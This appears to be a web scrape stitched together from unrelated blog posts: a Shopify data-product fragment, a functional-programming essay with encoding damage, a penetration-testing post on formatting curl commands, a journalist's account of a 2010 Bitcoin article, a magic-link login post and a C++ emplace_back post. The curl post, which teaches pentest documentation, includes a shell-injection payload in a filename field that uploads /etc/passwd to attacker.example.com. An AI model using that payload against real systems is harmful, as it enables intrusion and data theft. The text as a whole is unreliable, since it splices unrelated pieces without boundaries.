<figure><img alt="A sample Google Form that measures Prototype A's Scoring.  The form consists of 2 questions. The first question is &quot;Is the score easy to parse and interpret? It is scored using a ranking from 1 - 5 with 1 = Very Hard and 5 = Very Easy. The 2nd question is &quot;Additional Comments&quot; and has a text field for the answer." data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/sample-google-form.jpg?v=1614705664" src="https://cdn.shopify.com/s/files/1/0779/4361/files/sample-google-form.jpg?v=1614705664">
<figcaption>Feedback our team asked for the scoring system we created. When asking for feedback, you want to ask specific questions so you can yield better feedback.</figcaption>
</figure>
<p>We implemented the two tips when requesting feedback from users of the sales forecasting tool highlighted in the previous section. We asked a diverse group specific questions about our product, and learned that displaying a numerical score (0 - 100) was confusing. The difference between scores wasn’t clear to the users. Instead, it was suggested to display grades (A, B, C) which turned out to be much quicker to interpret and led to a better user experience.</p>
<p>At Shopify, following these tips has provided the team with a clearer path for launching brand new data products under tight time constraints. More importantly, it helped us avoid common pitfalls like getting stuck during neverending design phases, overengineering complex machine learning systems, or building data products that users don’t use.&nbsp;</p>
<p>Next time you’re under a tight timeline to ship a new data product, remember to:</p>
<ol>
<li>
<strong><em>Utilize design sprints</em></strong> to help focus your team’s efforts and remove the stress of the ticking clock</li>
<li>
<strong><em>Don’t skip on prototyping,</em></strong> it’s a great way to fail early</li>
<li>
<strong><em>Avoid machine learning</em></strong> (for first iterations) to avoid being slowed down by unnecessary complexity</li>
<li>
<strong><em>Talk to your users</em></strong> so you can get a better sense of what problem they’re facing and what they need in a product</li>
</ol>

<p>
  This article has been re-written, most of the original content has been moved to the next article.
</p>

<p>Wandering developer, your next adventure awaits, and I know youâ€™re ready because youâ€™ve been ready since you wrote your first line of code.</p>

<p>This journey will bring you fame of course, and glory, sooo much glory. But above all else, this journey will take you to that lost magical place where the code you write somehow speaks to you like a great melody sounds familiar even as you listen to it for the first time.</p>

<p>Itâ€™s ok for you to be <strong>skeptical</strong>, maybe all you care about is creating <strong>code that works</strong>, but this seemingly academic topic is a shortcut towards that, not a distraction, as it will dramatically reduce the times you create code that doesnâ€™t.</p>

<h2 id="do-not-postpone-this-journey">Do not postpone this journey</h2>

<p>Many have put it off in a futile attempt to master their craft first. Do not make this mistake, this journey requires no credentials or academic recognition of your readiness.</p>

<p>Do not ask for permission.</p>

<p>All you need is the <strong>love of your craft</strong> that took you here, and the inquisitive <strong>open mind</strong> of someone for whom no leap is too far to reach truer grounds.</p>

<h2 id="do-not-mistake-this-journey-for-what-its-not">Do not mistake this journey for what itâ€™s not</h2>

<p>The path ahead is not about learning an alternative way of doing the same thing, this would not be a good use of your time. Rather, this journey is about recognizing how misguided some of the concepts weâ€™ve held true have always been.</p>

<p>Going from the comfort of what you already know to the discomfort of what you donâ€™t even realize you donâ€™t know requires curiosity, but it also requires courage.</p>

<h2 id="there-is-no-courage-without-fear">There is no courage without fear</h2>

<p>The fear of investing oneâ€™s precious time learning something before even being capable of understanding its purpose is justified.</p>

<p>Your time, and even more so your mental energy is very precious. If you feel fear, accept it, embrace it even, for <strong><em>it</em></strong> is the proof that it was courage, not chance, that set you off on this journey.</p>

<h2 id="the-first-step-is-the-hardest">The first step is the hardest</h2>

<p>Even if it seems like dark magic, youâ€™ll very soon learn the basic spells, and by then you will already be a much better wizard.</p>

<p>Itâ€™s true that Functional Wonderland is vast and full of mysteries, but you donâ€™t have to venture deep to reap the rewards, in fact youâ€™ll get most of the value just from skirting its shores, and will not be doing it alone.</p>

<p>Indeed, you will not be the first <strong>object oriented programmer</strong> to set sail, neither will you be the last, but for all that attempted this perilous but infinitely rewarding journey it always started in the same <a href="https://impure.fun/fun/2021/03/04/the-objects-you-know-and-love-copy/">familiar place</a>.</p>

  <div>
    <h4>4 March 2021</h4>
    
    



    <p>An important part of each penetration test is the documentation of all discovered vulnerabilities.
The documentation often includes program calls to further demonstrate how a vulnerability was found, tested or exploited. To better visualise these steps in the context of web applications, we often include invocations of the command-line HTTP client <a href="https://curl.se/">curl</a>. In the following, we discuss how program calls can be styled for documentation to appeal to all audiences.</p>
<div>
        <p><img src="https://blog.redteam-pentesting.de/2021/wholesome-curl-calls/curl-help_hu01b7b4bf6fb2e671d3b4cc1141a5d2a3_15721_640x0_resize_box_2.png" alt="curl program call for help">
        </p>
    </div>



<p>You have probably seen some more or less cryptic curl program calls, included for example in blog posts, scripts, Dockerfiles or configuration files. The program calls often are formatted as one-liners that result in very long horizontal scroll bars. Sometimes the authors use abbreviated parameter names, making it hard to understand the meaning of arguments or options.</p>
<p>Truth be told: horizontal scrolling on a mobile device is not enjoyable. Neither is a lookup into the man page to check for the abbreviated parameter’s meanings. Therefore, one should strive to write program calls that are as self-explanatory and easy readable.</p>
<p>
    In the following, we use the public instance of the <a href="https://github.com/postmanlabs/httpbin"><code>httpbin</code></a> project to demonstrate some of the curl program calls.
</p>

<!-- raw HTML omitted -->
<h3 id="consider-using-self-explanatory-parameter-options">Consider Using Self-Explanatory Parameter Options</h3>
<p>Quite often curl program calls contain abbreviated parameters like the following to not verify the TLS certificate of the remote host:</p>
<pre><code>$ curl -k https://httpbin.org/status/301
</code></pre><p>To help your readers that might not be familiar with curl or the abbreviated program parameters just use the longer versions as these are in most cases self-explanatory:</p>
<pre><code>$ curl --insecure https://httpbin.org/status/301
</code></pre><h3 id="minimise-horizontal-scrolling">Minimise Horizontal Scrolling</h3>
<p>Consider you craft a complex curl command that has the necessity to connect insecurely, suppresses its output except for response data, makes use of cookies and also includes URL parameters:</p>
<!-- raw HTML omitted -->
<pre><code>$ curl -k -s -H 'Cookie: auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0;' 'https://httpbin.org/get?foo=1&amp;bar=2' | jq .args
</code></pre><p>As you see, such a program call could become very long. Instead of putting everything in one line, try to separate arguments in different lines. This makes the usage of self-explanatory parameters even more valuable:</p>
<pre><code>$ curl --insecure --silent \
--cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
'https://httpbin.org/get?foo=1&amp;bar=2' | jq .args
</code></pre><p>But what to do if your URL contains many parameters? One solution is to split the URL from the parameters like the following:</p>
<pre><code>$ curl --insecure --silent \
--cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
'https://httpbin.org/get'\
'?foo=1&amp;bar=2' | jq .args
</code></pre><p>Another approach that curl supports is to define URL parameters as separate arguments. Note that for this to work, the option <code>--get</code> can be used. This declares that all data parameters curl uses per default for HTTP POST requests are now used as URL parameters for the specified request method:</p>
<pre><code>$ curl --get \
--insecure --silent \
--cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
--data 'foo=1' --data 'bar=2' \
'https://httpbin.org/get' | jq .args
</code></pre><h3 id="pretty-formatting-for-cookies----and-other-surprises-along-the-way">Pretty Formatting for Cookies – And Other Surprises Along The Way</h3>
<p>Depending on your audience, you want to write program calls that are more or less verbose. Sometimes, you also may not be aware of a better variant and stick to the parameters you are used to. The following example is seen quite often:</p>
<pre><code>$ curl -H 'Cookie: example=AABBCC; auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0;' https://httpbin.org/cookies
</code></pre><p>The usage of the <code>-H</code> parameter is not the only possible solution here as there is also a parameter for cookies. For readability reasons, multiple usage of the <code>--cookie</code> parameter is desired. However, at the time of writing this blog post it was not possible as per documentation multiple usages will overwrite the last one. We <a href="https://twitter.com/RedTeamPT/status/1364130000669208578">asked</a> Daniel Stenberg (<a href="https://twitter.com/bagder">@bagder</a>), the creator of curl, why this behaviour distinguishes from other parameters like the <code>--data</code> variants. He responded with the following:</p>
<blockquote>
<p>It has worked like that since October 1998 when we originally created the option. Because nobody thought of making it different then or worked on changing it since.</p>
</blockquote>
<p>To our great delight, Daniel Gustafsson (<a href="https://twitter.com/d_gustafsson">@d_gustafsson</a>) which is also one of the curl authors, decided to create a <a href="https://github.com/curl/curl/pull/6649">pull request</a> to change this behaviour! Thanks to him, in future versions of curl it will be possible to use multiple <code>--cookie</code> parameters as a more elegant solution:</p>
<pre><code>$ curl --cookie 'example=AABBCC' \
--cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
https://httpbin.org/cookies
</code></pre><p>As this happened quite recently, the release is not available yet or maybe not shipped in popular Linux distributions for now. Alternatively, string concatenation per shell can be used to separate cookies in multiple lines:</p>
<pre><code>$ curl --cookie 'example=AABBCC;'\
'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0;' \
https://httpbin.org/cookies
</code></pre><p>Nevertheless, keep an eye out for new curl releases. 😉</p>
<p>Another option might be to first display a file containing a set of cookies, for example <code>cookies.txt</code>, which has a specific format according to the <a href="https://curl.se/docs/http-cookies.html">documentation</a>:</p>
<pre><code>$ cat cookies.txt
httpbin.org	FALSE	/	TRUE	0	example	AABBCC
httpbin.org	FALSE	/	TRUE	0	auth	eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0
</code></pre><p>Afterwards, you can use that file as an input for the cookie parameter:</p>
<pre><code>$ curl --cookie cookies.txt https://httpbin.org/cookies
</code></pre><h3 id="enjoyable-post-requests">Enjoyable POST Requests</h3>
<p>Next, we’ll have a closer look at HTTP POST requests. Let’s take the following example:</p>
<pre><code>$ curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'example=1&amp;input=2&amp;path=%2Fetc%2Fpasswd' https://httpbin.org/post
</code></pre><p>Here, most of the parameters can be omitted as curl automatically assumes an HTTP POST request with the respective <code>Content-Type</code> for it. Furthermore, it is not necessary to define the parameter values URL-encoded, as curl offers a neat functionality for it. As a benefit the arguments are easier to read:</p>
<pre><code>$ curl --data 'example=1' \
--data 'input=2' \
--data-urlencode 'path=/etc/passwd' \
https://httpbin.org/post
</code></pre><p>However, you still need to manually apply URL encoding for the name of a HTTP POST parameter if necessary. We opened a discussion thread for possible solutions at the <a href="https://github.com/curl/curl/discussions/6667">curl GitHub page</a>.</p>

<!-- raw HTML omitted -->
<p>Depending on how familiar your readers are with curl, it might be of additional value to add the HTTP method used while not technically necessary:</p>
<pre><code>$ curl --method POST \
--data 'example=1' \
--data 'input=2' \
--data-urlencode 'path=/etc/passwd' \

</code></pre><p>This should be considered for every option that might give readers a benefit in understanding what the program call is all about.</p>
<h3 id="about-forms">About Forms</h3>
<p>Finally, documenting file uploads or HTTP POST requests with the content type <code>multipart/form-data</code> is often very painful if directly copied from an attack proxy or somehow manually crafted for curl. For a more convenient usage the <code>--form</code> parameter is offered. An example request looks like the following:</p>
<pre><code>$ curl --cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
--form 'profile=@red.png;type=something/different;filename=testimage.png' \
--form 'example=1' \
--form 'auth=AABBCC' \
--form 'remark=&lt;longtext.txt' \
 https://httpbin.org/post
</code></pre><p>As you see in the request, the characters <code>@</code> and <code>&lt;</code> have special meanings. The first one signals that a file should be treated as a file upload, the second one reads a file and pastes the contents into the respective form field. During penetration tests, especially the value of a filename parameter could be interesting to test for shell injection vulnerabilities. Therefore, such a vulnerability could be easily demonstrated with curl using the <code>--form</code> parameter without the need to build the whole <code>multipart/form-data</code> request manually:</p>
<pre><code>$ curl --cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
--form 'profile=@red.png;filename='\
'"test.png; curl --upload-file /etc/passwd https://attacker.example.com;"' \
 https://httpbin.org/post
</code></pre><p>As the attentive reader may have noticed, the <code>&lt;</code> directive is not used for the example payload to exploit the shell injection to be read from a file because these two operators cannot be combined in one <code>--form</code> parameter value yet. Therefore, the injection is quoted and later concatenated in the shell.
We also created a discussion for this at the <a href="https://github.com/curl/curl/discussions/6669">curl GitHub page</a>. Feel free to contribute to the discussion!</p>
<!-- raw HTML omitted -->
<h3 id="final-thoughts">Final thoughts</h3>
<p>This is just a rough outline of what is possible with curl program calls. Generally speaking, it should be the number one goal for you to write program calls that are easily readable and quickly understandable. The approach is not only useful for documentation during penetration tests or blog posts. If program calls are used in scripts or code, the usage of comprehensive calls might also help you in the long run.</p>

<p><span><em><strong>TL;DR</strong> A news article I wrote for IDG in 2010 was the first mainstream media discussion of Bitcoin. As a direct result, the individual believed to have created Bitcoin—Satoshi Nakamoto—said “the swarm is headed towards us”. He disappeared after posting that to a forum, and hasn’t been heard from since. </em></span></p>
<p><span><em>Let’s make this clear from start: I didn’t force anybody into hiding, or know Satoshi Nakamoto. But if what I wrote was indeed a contributing factor, I am not proud of this. The thought I affected anybody’s life in a negative way hugely upsets me. But now that Bitcoin is insanely popular, the incident has become infamous. It’s time to tell my story.<strong> /TL;DR<span>&nbsp;</span></strong></em></span></p>
<figure id="attachment_106" aria-describedby="caption-attachment-106"><img loading="lazy" src="https://www.keirthomas.com/wp-content/uploads/2021/02/Screenshot-2021-02-24-at-7.35.25-am-300x255.png" alt="Bizfeed logo" width="300" height="255"><figcaption id="caption-attachment-106">Bizfeed logo</figcaption></figure><p>Back in 2010 I was a freelance journalist. I took work where I could find it. One of my jobs was to write news stories for PC World’s Bizfeed and Newsdesk blogs.</p>
<p>(Note for UK readers: PC World is one of the biggest US computing magazines/websites, and not a crappy tech retailer, like here in the UK!)</p>
<p>The goal with the blogging was simple and primitive: Break news stories before anybody else.</p>
<p>Doing so meant Google News would put our articles at the top of the list if that topic began to trend, because we got there first.<span>&nbsp;</span></p>
<p>That meant clicks. Clicks meant ad conversions.</p>
<p>It was necessary for me to hammer these articles out, usually writing the required two per day by lunchtime. Because I was in the UK, this meant they were ready for the site’s US editor when she arrived at work, 9am EST.</p>
<p>It always made me smile when I approached a source for an interview and they said something like, “Sure, I can speak to you Thursday next week”. By that time my article would not only be published but literally old news.</p>

<p>It’s the toughest writing job I’ve ever had. Some of the articles I wrote did amazingly well, like when I&nbsp;<a href="https://www.pcworld.com/article/226128/Sony_Makes_it_Official_PlayStation_Network_Hacked.html">covered the Sony PlayStation hacks</a>&nbsp;and managed to reveal key developments before anybody else.</p>
<p>I got paid a fraction of a cent per click, and a single popular article would pay my living expenses for a week, or even longer.</p>
<figure id="attachment_107" aria-describedby="caption-attachment-107"><img loading="lazy" src="https://www.keirthomas.com/wp-content/uploads/2021/02/Screenshot-2021-02-24-at-7.37.59-am-300x211.png" alt="Wikileaks blog screenshot" width="300" height="211"><figcaption id="caption-attachment-107">Wikileaks blog screenshot</figcaption></figure><p>Most articles I wrote sunk to the deeps of the ocean, leaving only a trail of bubbles behind. One of these was about how <a href="https://www.pcworld.com/article/213230/could_wikileaks_scandal_lead_to_new_virtual_currency.html">Wikileaks was asking for donations in something called Bitcoin</a>.<span>&nbsp;</span></p>
<p>Nobody back then knew what Bitcoin was. But I’d been following it as part of my general interest in open source technology.</p>
<p>So, I wrote the article. Remember: I had little time to do involved research. To write about something I already understood was a gift.</p>
<p>I wrote about how there was a mysterious guy behind it all: Satoshi Nakamoto. I can’t recall how I knew this. I think I just checked the official Bitcoin website.</p>
<p>Once the article was done, I immediately moved onto the next one, like I always did.&nbsp;</p>
<p>A few days later I got a few emails from people angry about the piece. I was accused of “lazy journalism”. They accused me of claiming Bitcoin was created by Wikileaks.</p>
<p>Reading the article now, I continue to believe these accusations are untrue. Offensive, even. Like any good journalist, I checked facts against canonical sources before submitting work to the editor.</p>
<p>The editor wouldn’t publish if I made stuff up.&nbsp;That isn’t how it works.&nbsp;</p>
<p>I promptly forgot all about the article, as I forgot about all the others.</p>

<p>Now working as a content writer at a software company, with the hack work of news blogging long behind me, I received a LinkedIn message from a journalist. He told me he was writing a book about Bitcoin.<span>&nbsp;</span></p>
<p>Would I be interested in being interviewed?<span>&nbsp;</span></p>
<p>What?! Why would he ask that?</p>
<p>By this point, Bitcoin was heading towards the moon. In that article back in 2010, I’d written that one Bitcoin was worth 20 cents. A coffee shop somewhere had begun accepting several in return for a steaming brew.</p>
<p>But now just one Bitcoin was worth over $9,000! I think I’m justified in using an emoji here:</p>

<p>It was making headlines in newspapers, with Nakamoto’s disappearance being a nut everybody wanted to crack. Where was he? Did he even exist?</p>
<p>“Your article made a huge impact,” wrote the journalist in his message to me.<span>&nbsp;</span></p>
<p>I had to google my article to even remember what I’d written.</p>
<p>The journalist continued (and I paraphrase here because I haven’t sought permission to quote him):<span>&nbsp;</span></p>
<blockquote>
<p>“In the history of Bitcoin, your article made Satoshi Nakamoto panic. Pretty soon he dropped all responsibility for Bitcoin. He handed over the project to Gavin Andresen and then largely disappeared.”</p>
</blockquote>
<p>Have you ever been told something that makes your stomach feel like it’s exited your body? That Charlie Brown feeling?</p>
<figure id="attachment_91" aria-describedby="caption-attachment-91"><img loading="lazy" src="https://www.keirthomas.com/wp-content/uploads/2021/02/sick-charlie-brown.jpg" alt="Charlie Brown feeling sick" width="300" height="185"><figcaption id="caption-attachment-91">Charlie Brown feeling sick</figcaption></figure><p>That’s how I felt.<span>&nbsp;But it was also tinged with excitement. As a journalist, knowing something I’ve written had gone on to create such an impact was incredible. That’s why writers do what we do!&nbsp;</span></p>
<p>I told my wife. Her jaw dropped to the floor. We discussed what must’ve been going through Nakamoto’s head. Couldn’t I just drop him a line and say sorry, she asked? Um. Sadly not.</p>
<p>I told colleagues. One of them used a website that tracks backlinks to find the original forum post where, in 2010, Nakamoto had written about my article – literally his final message to the world before disappearing:</p>

<blockquote>
<p>“It would have been nice to get this attention in any other context. WikiLeaks has kicked the hornet’s nest, and the swarm is headed towards us.” <a href="https://bitcointalk.org/index.php?topic=2216.0">https://bitcointalk.org/index.php?topic=2216.0</a></p>
</blockquote>
<p>I had never seen this forum post before.</p>
<p>Using the backlinking tool, I discovered that forum post and my article had entered Bitcoin folklore across the decade since. Countless people had discussed its significance.&nbsp;</p>
<p>I had absolutely no idea.</p>
<figure id="attachment_110" aria-describedby="caption-attachment-110"><img loading="lazy" src="https://www.keirthomas.com/wp-content/uploads/2021/02/Screenshot-2021-02-24-at-7.54.06-am-1024x200.png" alt="Satoshi Nakamoto's final post before disappearing" width="840" height="164"><figcaption id="caption-attachment-110">Satoshi Nakamoto’s final post before disappearing. Note his annoyance at Wikileaks, rather than at the article</figcaption></figure>
<p>And, really, this is the end of the story for me.</p>
<p>I didn’t get interviewed because I had nothing to tell. I never knew anybody involved with Bitcoin. I never knew Nakamoto. I have no inside information.<span>&nbsp;</span></p>
<p>Yet here I am, an actual footnote in one of the most fantastic stories in computing and perhaps even world finance.<span>&nbsp;</span></p>
<p>How do I feel?</p>
<p>Well.</p>

I’m pretty sure that isn’t Nakamoto!</figcaption></figure><p>I’ve been absolutely wrong two times about nascent technologies.<span>&nbsp;</span></p>
<p>The first was YouTube. I was convinced it would never be more than people posting clips stolen from TV shows. I never believed there would be something called a professional YouTuber (although I’m so glad there are – I spend a lot of time at that website today!).</p>
<p>The second was Bitcoin. I installed the Bitcoin-generating software back in 2010, ran it for a day or two, and then uninstalled it.</p>
<p>A virtual currency?! What a crazy idea!</p>
<p>While writing this today, I setup my second Bitcoin wallet after that first attempt in 2010. Yes, really. I’ve watched from afar. I’ve laughed with friends about how if I’d just left that app running back in 2010 I’d probably be writing this from a personal jet right now.&nbsp;</p>
<p>But I’ve never actually gone back and created a wallet – until now.&nbsp;</p>
<p>If you found my story interesting, why not drop a few cents in there. See below.&nbsp;</p>
<p>Oh, and if Mr Nakamoto is reading this then… Sorry. <a href="mailto:k@keirthomas.com">Drop me a line</a>. It’d be good to chat. I’d love to both know your story, and help share it with the world if you’d like that. Wouldn’t it be great to pick up the story at the point where it left off?</p>

                    <p>Passwords are dying. The cost of creating and maintaining passwords is becoming untenable. Which can be seen in the rise of users logging in with social products and developers outsourcing their pain to Auth0 and the likes. We decided to sidestep the password based authentication and went passwordless on our new product. Read on to see how you can go passwordless too.</p><p><strong>The cost of passwords</strong></p><p>Passwords create too much friction for users. It’s becoming difficult to come up with passwords that satisfy the ever growing password strength requirements - minimum 9 characters, 1 number, 1 upper case, 1 special character etc. And with the rise of data breaches where hackers steal and sell password data on the internet, passwords are only really effective when you don’t repeat them across different services. Which means you have to remember unique passwords or use a password manager.</p><p>Passwords are even more painful for developers to build and maintain. Imagine the work - 4 forms (signup, login, reset password, send forgot password link), storing passwords securely, managing email service providers for deliverability and spam scores. All this work just for the auth, which is not your core product and not what users come to you for. </p><p><strong>Magic links, the solution to the password problem</strong></p><p>An elegant solution to this mess is authenticating users using magic links sent on email. We all use email anyway as a core part of our online identity and authentication. So instead of logging in with email and password, you enter your email and get a login link sent to you. You might have seen Slack do this.</p><figure><img src="https://lh3.googleusercontent.com/2Yx1vwl0CygQi3k1aT9iKXiAETGQmsfaNuE2uA4-KsTWrGKN-WjwAGQv_XwPOpv3zainHdNZ29jbxiJYBIbVo-iKPAE9BMHIkVlKZQgVFzJK0dxaoaoJmQ6a-k5UuKDmNecYiqZY"><figcaption>Slack popularised magic links for logging in</figcaption></figure><p><strong>How we went passwordless with magic link</strong></p><p>When we were building our new product, we didn’t want to spend time building full blown password auth, so we decided on using magic links. And although the work involved building a magic link system is less than traditional auth, it is still valuable developer time spent on non-core plumbing. After some research, we found <a href="https://magic.link/">Magic</a> which provides magic links as a service. We loved the focus on security (the founders have built a security product in the past), the good design and the developer friendly docs. </p><p>The implementation involves a client SDK (for web and mobile) for showing the Magic overlay (screenshots below) and server code for managing sessions. We used the sample code provided to implement this. </p><p><strong>The user experience of magic links</strong></p><p>Login form</p><figure><img src="https://lh6.googleusercontent.com/87Sh7Be5B83QExzyE2bF12OGsrTom6Lpw-haLYteMvUUaoFyZbe9FLozGgE1bcMgB7x0NyTThb0fj-uqwanGADb3OpA9x5srYvNqVGlKSvPoy9XvYR4xjDwEcKNKInFDNC8JUAqD"><figcaption>Sign up and Log in form</figcaption></figure><p>Email</p><figure><img src="https://lh5.googleusercontent.com/EtAzDiIBqb7SpaSTW6W3qRB5J7E7uq-ThWLXWPczkdIKIXXbhRK74OlQkFMrcTIkWXI5YJC7blPMl5qblW4wF5mM_JpFOicTIXy_rr0R9Ijn0dsSJv4O-a0xfFBJRs38F0MYlxfk"><figcaption>Magic link email</figcaption></figure><p>You can <a href="https://incidents.sh/">try out the experience for yourself</a> on our new product. It’s a free timer for developers to keep track of major software incidents, built by the team who also built the simple <a href="https://spike.sh/">incident alerting</a> product for developers.</p><p><strong>Conclusion</strong></p><p>After using magic links as a developer and as a user, I loved the experience. There are still some hiccups as with any new technology, but overall this looks like the future. And I am quite excited to watch it unfold!</p>

March 4, 2021 | https://quuxplusone.github.io/blog/2021/03/03/push-back-emplace-back/ | <a href="https://web.archive.org/web/*/https://quuxplusone.github.io/blog/2021/03/03/push-back-emplace-back/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>In one of my recent training courses, a student informed me that both clang-tidy
and PVS-Studio were complaining about some code of the form</p>

<div><div><pre><code>std::vector&lt;Widget&gt; widgets;
~~~
widgets.push_back(Widget(foo, bar, baz));
</code></pre></div></div>

<p>Both tools flagged this line as “bad style.”
clang-tidy even offered a (SARCASM ALERT) helpful fixit:</p>

<div><div><pre><code>warning: use emplace_back instead of push_back [modernize-use-emplace]
    widgets.push_back(Widget(foo, bar, baz));
            ^~~~~~~~~~~~~~~~~             ~
            emplace_back(
</code></pre></div></div>

<p>The student dutifully changed the line, and both tools reported their
satisfaction with the replacement:</p>

<div><div><pre><code>widgets.emplace_back(Widget(foo, bar, baz));
</code></pre></div></div>

<p>The original line materializes a temporary <code>Widget</code> object on the stack;
takes an rvalue reference to it; and passes that reference to
<code>vector&lt;Widget&gt;::push_back(Widget&amp;&amp;)</code>, which move-constructs a <code>Widget</code>
into the vector. Then we destroy the temporary.</p>

<p>The student’s replacement materializes a temporary <code>Widget</code> object on the stack;
takes an rvalue reference to it; and passes that reference to
<code>vector&lt;Widget&gt;::emplace_back&lt;Widget&gt;(Widget&amp;&amp;)</code>, which move-constructs
a <code>Widget</code> into the vector. Then we destroy the temporary.</p>

<p><em>Absolutely no difference.</em></p>

<p>The change clang-tidy meant to suggest — and in fact <em>did</em> suggest,
if you pay very close attention to the underlining in the fixit — was actually this:</p>

<div><div><pre><code>widgets.emplace_back(foo, bar, baz);
</code></pre></div></div>

<p>This version does <em>not</em> materialize any <code>Widget</code> temporaries. It simply
passes <code>foo, bar, baz</code> to <code>vector&lt;Widget&gt;::emplace_back&lt;Foo&amp;, Bar&amp;, Baz&amp;&gt;(Foo&amp;, Bar&amp;, Baz&amp;)</code>,
which constructs a <code>Widget</code> into the vector using whatever
constructor of <code>Widget</code> best matches that bunch of arguments.</p>

<h2 id="emplace_back-is-not-magic-c11-pixie-dust"><code>emplace_back</code> is not magic C++11 pixie dust</h2>

<p>Even a decade after C++11 was released, I still sometimes see programmers assume
that <code>emplace_back</code> is somehow related to move semantics. (In the same way that
some programmers assume lambdas are somehow the same thing as <code>std::function</code>,
you know?) For example, they’ll rightly observe that this code makes an
unnecessary copy:</p>

<div><div><pre><code>void example() {
    auto w = Widget(1,2,3);
    widgets.push_back(w);  // Copy-constructor alert!
}
</code></pre></div></div>

<p>So they’ll change it to this:</p>

<div><div><pre><code>void example() {
    auto w = Widget(1,2,3);
    widgets.emplace_back(w);  // Fixed? Nope!
}
</code></pre></div></div>

<p>The original line constructs a <code>Widget</code> object into <code>w</code>, then
passes <code>w</code> by reference to <code>vector&lt;Widget&gt;::push_back(const Widget&amp;)</code>,
which copy-constructs a <code>Widget</code> into the vector.</p>

<p>The replacement constructs a <code>Widget</code> object into <code>w</code>, then
passes <code>w</code> by reference to <code>vector&lt;Widget&gt;::emplace_back&lt;Widget&amp;&gt;(Widget&amp;)</code>,
which copy-constructs a <code>Widget</code> into the vector.</p>

<p><em>Absolutely no difference.</em></p>

<p>What the student should have done is ask the compiler to make an
<em>rvalue</em> reference to <code>w</code>, by saying either</p>

<div><div><pre><code>widgets.push_back(std::move(w));
</code></pre></div></div>

<p>or</p>

<div><div><pre><code>widgets.emplace_back(std::move(w));
</code></pre></div></div>

<p>It doesn’t matter which verb you use; what matters is the value category of
<code>w</code>. You must explicitly mention <code>std::move</code>, so that the language (and the
human reader) understand that you’re done using <code>w</code> and it’s okay for
<code>widgets</code> to pilfer its guts.</p>

<p><code>emplace_back</code> was added to the language at the same time as <code>std::move</code> — just
like lambdas were added at the same time as <code>std::function</code> — but that doesn’t
make them the same thing. <code>emplace_back</code> may “look more C++11-ish,” but it’s
not magic move-enabling pixie dust and it will never insert a move in a place
you don’t explicitly request one.</p>

<h2 id="when-all-else-is-equal-prefer-push_back-to-emplace_back">When all else is equal, prefer <code>push_back</code> to <code>emplace_back</code></h2>

<p>So, given that these two lines do the same thing and are equally efficient
at runtime, which should I prefer, stylistically?</p>

<div><div><pre><code>widgets.push_back(std::move(w));
widgets.emplace_back(std::move(w));
</code></pre></div></div>

<p>I recommend sticking with <code>push_back</code> for day-to-day use. You should definitely
use <code>emplace_back</code> when you need its particular set of skills — for example, <code>emplace_back</code>
is your only option when dealing with a <code>deque&lt;mutex&gt;</code> or other non-movable type —
but <code>push_back</code> is the appropriate default.</p>

<p>One reason is that <code>emplace_back</code> is more work for the compiler.
<code>push_back</code> is an overload set of two non-template member functions.
<code>emplace_back</code> is a single variadic template.</p>

<div><div><pre><code>void push_back(const Widget&amp;);
void push_back(Widget&amp;&amp;);

template&lt;class... Ts&gt;
reference emplace_back(Ts&amp;&amp;...);
</code></pre></div></div>

<p>When you call <code>push_back</code>, the compiler must do overload resolution, but that’s all.
When you call <code>emplace_back</code>, the compiler must do template type deduction, followed
by (easy-peasy) overload resolution, followed by function template instantiation and
code generation. That’s a much larger amount of work for the compiler.</p>

<h2 id="the-benchmark-program">The benchmark program</h2>

<p>I wrote a simple test program to demonstrate the difference in compiler workload.
Of course <a href="https://en.wikipedia.org/wiki/Amdahl%27s_law">Amdahl’s Law</a> applies:
my benchmark displays a massive difference because it’s doing <em>nothing but</em>
instantiating <code>emplace_back</code>, whereas any production codebase will be doing vastly
more other stuff relative to the number of times it instantiates <code>emplace_back</code>.
Still, I hope this benchmark gives you a sense of why I recommend “<code>push_back</code> over
<code>emplace_back</code>” and not vice versa.</p>

<p>This Python 3 script generates the benchmark:</p>

<div><div><pre><code>import sys
print('#include &lt;vector&gt;')
print('#include &lt;string&gt;')
print('extern std::vector&lt;std::string&gt; v;')
for i in range(1000):
    print('void test%d() {' % i)
    print('    v.%s_back("%s");' % (sys.argv[1], 'A' * i))
    print('}')
</code></pre></div></div>

<p>Generate like this:</p>

<div><div><pre><code>python generate.py push &gt;push.cpp
python generate.py emplace &gt;emplace.cpp
time g++ -c push.cpp
time g++ -c emplace.cpp
</code></pre></div></div>

<p>With Clang trunk on my laptop, I get consistently about 1.0s for the <code>push</code> version,
and 4.2s for the <code>emplace</code> version. This big difference is due to the fact that the
<code>push</code> version is merely code-generating a thousand <code>test</code> functions, whereas
the <code>emplace</code> version is code-generating that same thousand <code>test</code> functions <em>and</em>
another thousand template instantiations of <code>emplace_back</code> with different parameter
types:</p>

<div><div><pre><code>vector&lt;string&gt;::emplace_back&lt;const char(&amp;)[1]&gt;(const char (&amp;)[1])
vector&lt;string&gt;::emplace_back&lt;const char(&amp;)[2]&gt;(const char (&amp;)[2])
vector&lt;string&gt;::emplace_back&lt;const char(&amp;)[3]&gt;(const char (&amp;)[3])
vector&lt;string&gt;::emplace_back&lt;const char(&amp;)[4]&gt;(const char (&amp;)[4])
~~~
</code></pre></div></div>

